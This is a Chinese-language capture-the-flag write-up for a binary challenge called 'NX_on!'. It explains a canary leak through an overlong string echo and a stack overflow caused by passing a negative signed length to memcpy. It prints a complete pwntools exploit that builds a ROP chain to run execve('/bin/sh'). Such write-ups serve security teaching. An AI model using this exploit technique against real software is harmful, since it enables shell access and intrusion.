# NX_on!

## 题目简述

程序开启 NX 和 canary。第一处字符串回显可覆盖 canary 的首个零字节并泄漏余下七字节；第二处把有符号长度交给以 `size_t` 接收长度的 `memcpy`，特定负数会转换成巨大的无符号数并造成栈溢出。程序为静态链接，可直接用现有 gadget 构造 `execve("/bin/sh", 0, 0)`。

## 解题过程

先发送 24 字节填充和一个非零字节。回显不再在 canary 开头停止，于是读出后七字节并补回最低位的 `\x00`：

```python
from pwn import context, p64, remote, u64

context.arch = "amd64"
io = remote("host", 10000)

pop_rax = 0x4508B7
pop_rdi = 0x40239F
pop_rsi = 0x40A40E
pop_rdx_extra = 0x49D12B
syscall = 0x402154
bin_sh = 0x4E3950

prefix = b"A" * 0x18
io.sendafter(b"id?", prefix + b"B")
io.recvuntil(prefix)
leaked = io.recvn(8)
canary = u64(b"\x00" + leaked[1:])

payload = b"C" * 0x18 + p64(canary) + b"D" * 8
payload += p64(pop_rax) + p64(59)
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx_extra) + p64(0) + p64(0)
payload += p64(syscall)

io.sendlineafter(b"name?\n", payload)
io.sendlineafter(b"quit\n", b"-11111")
io.interactive()
```

`-1` 并不是“越大越好”：glibc 的优化版 `memmove/memcpy` 会根据长度选择不同复制路径。调试可见，某些值会让向高地址复制的 32 字节 `vmovdqa` 直接覆盖当前栈顶返回地址，另一些值则令源地址计算落到类似 `0xffffffff...` 的不可访问区。`-11111` 是在本题具体栈布局和 glibc 实现下验证可用的长度。

## 方法总结

本题由两条独立原语组成：字符串回显泄漏 canary，以及有符号到 `size_t` 的转换制造越界复制。负长度触发的是未定义/非预期路径，不能只按“转换后非常大”推断一定可用；应在目标 libc 中动态确认复制方向、访问区间和最终覆盖位置。
